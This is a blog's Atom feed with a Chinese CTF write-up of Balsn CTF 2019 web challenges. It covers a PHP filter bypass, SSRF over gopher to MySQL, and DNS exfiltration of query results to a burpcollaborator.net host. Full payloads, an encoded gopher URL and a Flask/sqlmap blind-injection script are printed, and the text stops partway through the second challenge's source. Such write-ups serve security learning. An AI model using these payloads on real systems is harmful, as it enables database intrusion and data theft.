<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wywwzjj&#39;s Blog</title>
  
  <subtitle>çˆ±å­¦ä¹ ï¼Œçˆ±åˆ†äº«ï¼Œçˆ±ç”Ÿæ´»</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://wywwzjj.top/"/>
  <updated>2019-11-04T02:22:37.181Z</updated>
  <id>https://wywwzjj.top/</id>
  
  <author>
    <name>wywwzjj</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Balsn CTF 2019 ä¸¤é“ web é¢˜</title>
    <link href="https://wywwzjj.top/2019/11/06/BalsnCTF-2019-%E4%B8%A4%E9%81%93web%E9%A2%98/"/>
    <id>https://wywwzjj.top/2019/11/06/BalsnCTF-2019-ä¸¤é“webé¢˜/</id>
    <published>2019-11-06T02:21:58.000Z</published>
    <updated>2019-11-04T02:22:37.181Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h2><blockquote><p>å¸¸è§ç»•è¿‡ã€gopher æ‰“ MySQLã€SSRF</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7wblbfld6j20sf0artal.jpg" alt></p><p>ä¸€æ‰“å¼€é¢˜ç›®å°±èƒ½çœ‹åˆ°æºç ï¼Œç¨ç¨æœ‰ç‚¹æ··æ·†ï¼Œæ•´ç†ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($secret = base64_decode(str_rot13(<span class="string">"CTygMlOmpz"</span> . <span class="string">"Z9VaSkYzcjMJpvCt=="</span>)))</span><br><span class="line">    &amp;&amp; highlight_file(<span class="keyword">__FILE__</span>)</span><br><span class="line">    &amp;&amp; (<span class="keyword">include</span>(<span class="string">"config.php"</span>))</span><br><span class="line">    &amp;&amp; ($op = @$_GET[<span class="string">'op'</span>])</span><br><span class="line">    &amp;&amp; (@strlen($op) &lt; <span class="number">3</span> &amp;&amp; @($op + <span class="number">8</span>) &lt; <span class="string">'A_A'</span>)) &#123;</span><br><span class="line">    $_ = @$_GET[<span class="string">'Î£&gt;â€•(#Â°Ï‰Â°#)â™¡â†’'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00-!\'0-9"`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i'</span>, $_)</span><br><span class="line">        || @strlen(count_chars(strtolower($_), <span class="number">3</span>)) &gt; <span class="number">13</span></span><br><span class="line">        || @strlen($_) &gt; <span class="number">19</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>($secret);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        @curl_setopt(</span><br><span class="line">            $ch,</span><br><span class="line">            CURLOPT_URL,</span><br><span class="line">            str_repLace(</span><br><span class="line">                <span class="string">"int"</span>,</span><br><span class="line">                <span class="string">":DD"</span>,</span><br><span class="line">                str_repLace(</span><br><span class="line">                    <span class="string">"%69%6e%74"</span>,</span><br><span class="line">                    <span class="string">"XDDD"</span>,</span><br><span class="line">                    str_repLace(</span><br><span class="line">                        <span class="string">"%2e%2e"</span>,</span><br><span class="line">                        <span class="string">"Q___Q"</span>,</span><br><span class="line">                        str_repLace(</span><br><span class="line">                            <span class="string">".."</span>,</span><br><span class="line">                            <span class="string">"QAQ"</span>,</span><br><span class="line">                            str_repLace(</span><br><span class="line">                                <span class="string">"%33%33%61"</span>,</span><br><span class="line">                                <span class="string">"&gt;__&lt;"</span>,</span><br><span class="line">                                str_repLace(</span><br><span class="line">                                    <span class="string">"%63%3a"</span>,</span><br><span class="line">                                    <span class="string">"WTF"</span>,</span><br><span class="line">                                    str_repLace(</span><br><span class="line">                                        <span class="string">"633a"</span>,</span><br><span class="line">                                        <span class="string">":)"</span>,</span><br><span class="line">                                        str_repLace(</span><br><span class="line">                                            <span class="string">"433a"</span>,</span><br><span class="line">                                            <span class="string">":("</span>,</span><br><span class="line">                                            str_repLace(</span><br><span class="line">                                                <span class="string">"\x63:"</span>,</span><br><span class="line">                                                <span class="string">"ggininder"</span>,</span><br><span class="line">                                                strtolower(<span class="keyword">eval</span>(<span class="string">"return $_;"</span>))</span><br><span class="line">                                            )</span><br><span class="line">                                        )</span><br><span class="line">                                    )</span><br><span class="line">                                )</span><br><span class="line">                            )</span><br><span class="line">                        )</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">        @curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">1</span>);</span><br><span class="line">        @curl_EXEC($ch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (@strlen($op) &lt; <span class="number">4</span> &amp;&amp; @($op + <span class="number">78</span>) &lt; <span class="string">'A__A'</span>) &#123;</span><br><span class="line">    $_ = @$_GET[<span class="string">'â£'</span>];  <span class="comment"># \u2063</span></span><br><span class="line">    <span class="comment">//http://warmup.balsnctf.com/?%E2%81%A3=index.php%20&amp;op=-79</span></span><br><span class="line">    <span class="keyword">if</span> ((strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'.php'</span>)</span><br><span class="line">        || (strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'php.'</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\""</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\x3e"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\x3c"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos(strtolower($_), <span class="string">"amp"</span>) !== <span class="keyword">FALSE</span>))</span><br><span class="line">        <span class="keyword">die</span>($secret);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($_, <span class="string">".."</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>($secret);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (stripos($_, <span class="string">"\x24"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>($secret);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                print_r(substr(@file_get_contents($_), <span class="number">0</span>, <span class="number">155</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>($secret) &amp;&amp; system($_GET[<span class="number">0x9487945</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å¹¶ä¸éœ€è¦é¢å¤–é…ç½®ï¼Œå´åŠ è½½äº†ä¸€ä¸ª <code>config.php</code>ï¼Œæœ‰ç‚¹è¹Šè··ï¼Œå…ˆè¯»ä¸‹æºä»£ç çœ‹çœ‹ã€‚æœ‰ä¸¤ç§åŠæ³•ï¼Œä¸€æ˜¯é€šè¿‡ <code>eval</code>ï¼Œè€Œæ˜¯åˆ©ç”¨ <code>file_get_contents</code>ï¼Œåè€…æ˜æ˜¾è¦ç®€å•äº›ã€‚è¿™æ ·çš„åç¼€æ£€æŸ¥åŠ ä¸ªç©ºæ ¼å°±èƒ½è¿‡ã€‚å› ä¸ºè¯»å–æœ‰é•¿åº¦é™åˆ¶ï¼Œå¯ç›´æ¥ä½¿ç”¨ä¼ªåè®®è¿›è¡Œå‹ç¼©ï¼Œç„¶åè§£å‹å³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = file_get_contents(<span class="string">"http://warmup.balsnctf.com/?op=-99&amp;%E2%81%A3=php://filter/zlib.deflate/resource=config.php%20"</span>);</span><br><span class="line">$idx = stripos($content, <span class="string">"&lt;/code&gt;"</span>) + <span class="number">7</span>;</span><br><span class="line">file_put_contents(<span class="string">"/tmp/233"</span>, substr($content, $idx));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/zlib.inflate/resource=/tmp/233"</span>);</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å†…å®¹å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file:config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    <span class="comment">// THIS IS THE CONFIG OF THE MYSQL DB</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    $host = <span class="string">"localhost"</span>;</span><br><span class="line">    $user = <span class="string">"admin"</span>;</span><br><span class="line">    $pass = <span class="string">""</span>;</span><br><span class="line">    $port = <span class="number">8787</span>;</span><br><span class="line">    <span class="comment">// hint:flag-is-in-the-database XDDDDDDD</span></span><br><span class="line">    <span class="comment">// ====================================</span></span><br><span class="line">    %</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°äº†è¿™ä¸ªæç¤ºï¼ŒMySQL è¿˜æ˜¯ç©ºå¯†ç ï¼Œç›®æ ‡å°±ç›¸å½“æ˜ç¡®äº†ï¼Œ<code>gopher</code> æ‰“ MySQL å³å¯ï¼Œ<code>file_get_contents</code> ä¸€èˆ¬æ‰“ä¸å‡º <code>gopher</code>ã€‚é‚£å°±åˆ©ç”¨ä¹‹å‰çš„ <code>curl</code>ï¼Œè¿™é‡Œä¹Ÿæœ‰ä¸‰é‡é™åˆ¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/[\x00-!\'0-9"`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i'</span>, $_)</span><br><span class="line">        || @strlen(count_chars(strtolower($_), <span class="number">3</span>)) &gt; <span class="number">13</span></span><br><span class="line">        || @strlen($_) &gt; <span class="number">19</span>) &#123;</span><br></pre></td></tr></table></figure><p>è‡³äºç¬¬ä¸€ä¸ªæ­£åˆ™åŒ¹é…ï¼Œå–åå°±è¡Œäº†ï¼Œéƒ½æ˜¯å¸¸è§æŠ€å·§ï¼Œæ¯”å¦‚ <code>phpinfo</code> =&gt; <code>(~%8F%97%8F%96%91%99%90)()</code>ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55ly1g7wda6pcyqj215v07wgmy.jpg" alt="image.png"></p><p><code>gopher</code> çš„ payload éƒ½æ¯”è¾ƒé•¿ï¼Œç›´æ¥ä¼ æ˜¯ä¸å¯èƒ½çš„ã€‚ä¹‹å‰å‡ºè¿‡å¾ˆå¤šæ— å‚å‡½æ•°çš„é¢˜ï¼Œå¸¸è§çš„æ‰‹æ³•æ˜¯é€šè¿‡ <code>getenv</code>ã€<code>getallheaders</code> ã€<code>get_defined_vars</code>ä¹‹ç±»çš„å‡½æ•°è·å–å‚æ•°ã€‚ç”±äºé•¿åº¦çš„é™åˆ¶ï¼Œæœ€å¥½çš„é€‰æ‹©å°±æ˜¯ <code>getenv</code>ã€‚</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%98%9A%8B%9A%91%89)(~%B7%AB%AB%AF%A0%A7) =&gt; <span class="keyword">getenv</span>(<span class="string">"HTTP_T"</span>)</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7wnp8fcxzj20p803smxh.jpg" alt="image.png"></p><p>æˆåŠŸæ‰“å‡ºè¯·æ±‚ï¼Œæ¥ä¸‹æ¥ç»§ç»­æ‰“ MySQLï¼Œ <a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">Gopherus</a> ç”Ÿæˆä¸‹ payloadã€‚</p><p>phpinfo ä¸­èƒ½çœ‹åˆ°æ˜¯ Windows çš„æœºå™¨ï¼ŒéªŒè¯ä¸€ä¸‹èƒ½ä¸èƒ½ <a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="noopener">DNS æ•°æ®å¤–å¸¦</a>ï¼Œä¸ç„¶åªèƒ½å½“ç›²æ³¨å¤„ç†äº†ã€‚</p><p>ï¼ˆPSï¼šæœ¬åœ°å®éªŒè®°å¾—ä¿®æ”¹ mysql.ini æ–‡ä»¶ï¼Œåœ¨ [mysqld] ä¸‹åŠ å…¥ secure_file_priv =  )</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Give MySQL username: admin</span><br><span class="line">Give port: <span class="number">8787</span></span><br><span class="line">Give query <span class="keyword">to</span> execute: <span class="keyword">select</span> load_file(concat('\\\\',version(),'.<span class="number">9</span>fp<span class="number">07</span>q<span class="number">2</span>nho<span class="number">1</span>v<span class="number">8</span>tn<span class="number">68</span>szls<span class="number">54</span>d<span class="number">94</span>fu<span class="number">3</span>j.burpcollaborator.net/a'))<span class="comment">;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Your gopher link is ready to do SSRF : </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">gopher://127.0.0.1:8787/_%a4%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%61%64%6d%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%65%00%00%00%03%73%65%6c%65%63%74%20%6c%6f%61%64%5f%66%69%6c%65%28%63%6f%6e%63%61%74%28%27%5c%5c%5c%5c%27%2c%76%65%72%73%69%6f%6e%28%29%2c%27%2e%39%66%70%30%37%71%32%6e%68%6f%31%76%38%74%6e%36%38%73%7a%6c%73%35%34%64%39%34%66%75%33%6a%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%2f%61%27%29%29%3b%01%00%00%00%01</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸæ”¶åˆ°è¯·æ±‚ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10<span class="selector-class">.3</span><span class="selector-class">.16-MariaDB</span><span class="selector-class">.9fp07q2nho1v8tn68szls54d94fu3j</span><span class="selector-class">.burpcollaborator</span><span class="selector-class">.net</span>.</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·å–æ•°æ®ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">"\\\\"</span>,<span class="keyword">substr</span>(<span class="keyword">hex</span>(<span class="keyword">group_concat</span>(schema_name)),<span class="number">39</span>,<span class="number">68</span>),<span class="string">".9fp07q2nho1v8tn68szls54d94fu3j.burpcollaborator.net/a"</span>)) <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"><span class="comment">-- å¾—åˆ°äº†æ•°æ®åº“å test,thisisthedbnameï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å¤ªé•¿äº†å‡ºä¸äº†ç½‘ï¼Œä¸èƒ½å‡ºç°åƒé€—å·è¿™ç§çš„ç‰¹æ®Šç¬¦å·</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯è€å¥—è·¯äº†ï¼Œè¯»è¡¨åã€åˆ—åï¼Œæ‹¿æ•°æ®ã€‚</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">42616C736E7B337A5F77316E643077735F7068705F6368346C7D</span>  =&gt;  Balsn&#123;<span class="number">3</span>z_w1nd0ws_php_ch4l&#125;</span><br></pre></td></tr></table></figure><p>æœ‰å¸ˆå‚…æŠŠä¸Šé¢çš„è¿‡ç¨‹æ•´åˆäº†ä¸‹ï¼Œé€šè¿‡ flask è½¬å‘ï¼Œç„¶åå°±èƒ½ sqlmap ä¸€æŠŠæ¢­ï¼Œå€¼å¾—å­¦ä¹ ï¼Œä»£ç å¦‚ä¸‹ã€‚</p><p> <a href="https://movrment.blogspot.com/2019/10/balsn-ctf-2019-web-warmup.html" target="_blank" rel="noopener">https://movrment.blogspot.com/2019/10/balsn-ctf-2019-web-warmup.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySQL</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\033[31m"</span>+<span class="string">"For making it work username should not be password protected!!!"</span>+ <span class="string">"\033[0m"</span></span><br><span class="line">    user = <span class="string">'admin'</span> <span class="comment">#raw_input("\033[96m" +"\nGive MySQL username: " + "\033[0m")</span></span><br><span class="line">    encode_user = user.encode(<span class="string">"hex"</span>)</span><br><span class="line">    user_length = len(user)</span><br><span class="line">    temp = user_length - <span class="number">4</span></span><br><span class="line">    length = (chr(<span class="number">0xa3</span>+temp)).encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">    dump = length + <span class="string">"00000185a6ff0100000001210000000000000000000000000000000000000000000000"</span></span><br><span class="line">    dump +=  encode_user</span><br><span class="line">    dump += <span class="string">"00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c"</span></span><br><span class="line">    dump += <span class="string">"69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d"</span></span><br><span class="line">    dump += <span class="string">"067838365f36340c70726f6772616d5f6e616d65056d7973716c"</span></span><br><span class="line"></span><br><span class="line">    query = <span class="string">"show databases;"</span>;<span class="comment">#raw_input("\033[96m" +"Give query to execute: "+ "\033[0m")</span></span><br><span class="line"></span><br><span class="line">    auth = dump.replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        a = [s[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>)]</span><br><span class="line">        <span class="comment">#return "gopher://127.0.0.1:3306/_%" + "%".join(a)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"gopher://127.0.0.1:8787/_%"</span> + <span class="string">"%"</span>.join(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_payload</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(query.strip()!=<span class="string">''</span>):</span><br><span class="line">            query = query.encode(<span class="string">"hex"</span>)</span><br><span class="line">            query_length = <span class="string">'&#123;:06x&#125;'</span>.format((int((len(query) / <span class="number">2</span>) + <span class="number">1</span>)))</span><br><span class="line">            query_length = query_length.decode(<span class="string">'hex'</span>)[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>)</span><br><span class="line">            pay1 = query_length + <span class="string">"0003"</span> + query</span><br><span class="line">            final = self.encode(self.auth + pay1 + <span class="string">"0100000001"</span>)</span><br><span class="line">            <span class="keyword">return</span> final</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> encode(self.auth)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">'.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blind</span><span class="params">()</span>:</span></span><br><span class="line">    username = request.args.get(<span class="string">'username'</span>)</span><br><span class="line">    url = <span class="string">"http://localhost/gg.php"</span></span><br><span class="line">    url = <span class="string">"http://warmup.balsnctf.com/"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">n</span><span class="params">(s)</span>:</span></span><br><span class="line">        r = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            r += chr(~(ord(i)) &amp; <span class="number">0xFF</span>)</span><br><span class="line">        r = <span class="string">"~&#123;&#125;"</span>.format(r)</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">    t = <span class="string">'('</span> + n(<span class="string">'getenv'</span>) + <span class="string">')('</span> +n(<span class="string">'HTTP_X'</span>) + <span class="string">')'</span></span><br><span class="line">    <span class="comment"># x = MySQL().get_payload("select IF(TRUE AND (select '1'='&#123;username&#125;'), sleep(10), sleep(0));".format(username=username))</span></span><br><span class="line">    x = MySQL().get_payload(<span class="string">"select id from (select 1 as id)a where id='&#123;username&#125;';"</span>.format(username=username))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> repr(x)</span><br><span class="line">    <span class="keyword">print</span> len(t)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(url=url, params = &#123;</span><br><span class="line">                <span class="string">'op'</span> : <span class="string">'-9'</span>,</span><br><span class="line">                <span class="string">'Î£&gt;â€•(#Â°Ï‰Â°#)â™¡â†’'</span> : t</span><br><span class="line">            &#125;,</span><br><span class="line">            cookies = &#123;<span class="string">"PHPSESSID"</span> : <span class="string">"123"</span>&#125;,</span><br><span class="line">            headers = &#123;<span class="string">"X"</span>: x&#125;,</span><br><span class="line">            timeout = <span class="number">1.5</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        time.sleep(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">python sqlmap.py -u "http://localhost:5000/?username=*" --technique=T --dbms=mysql --dbs  --level 1 --time-sec=2</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="éŸ©å›½é±¼"><a href="#éŸ©å›½é±¼" class="headerlink" title="éŸ©å›½é±¼"></a>éŸ©å›½é±¼</h2><blockquote><p>DNS rebindingã€SSTIã€å‘½ä»¤æ‰§è¡Œ</p></blockquote><p>é¢˜ç›®ç›´æ¥æ”¾å‡ºäº† docker ç¯å¢ƒï¼Œæœ‰ä¸ª readflag.cï¼Œçœ‹æ¥æ˜¯è¦æ‰§è¡Œå‘½ä»¤ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'default_socket_timeout'</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$waf = <span class="keyword">array</span>(<span class="string">"@"</span>,<span class="string">"#"</span>,<span class="string">"!"</span>,<span class="string">"$"</span>,<span class="string">"%"</span>,<span class="string">"&lt;"</span>, <span class="string">"*"</span>, <span class="string">"'"</span>, <span class="string">"&amp;"</span>, <span class="string">".."</span>, <span class="string">"localhost"</span>, <span class="string">"file"</span>, <span class="string">"gopher"</span>, <span class="string">"flag"</span>, <span class="string">"information_schema"</span>, <span class="string">"select"</span>, <span class="string">"from"</span>, <span class="string">"sleep"</span>, <span class="string">"user"</span>, <span 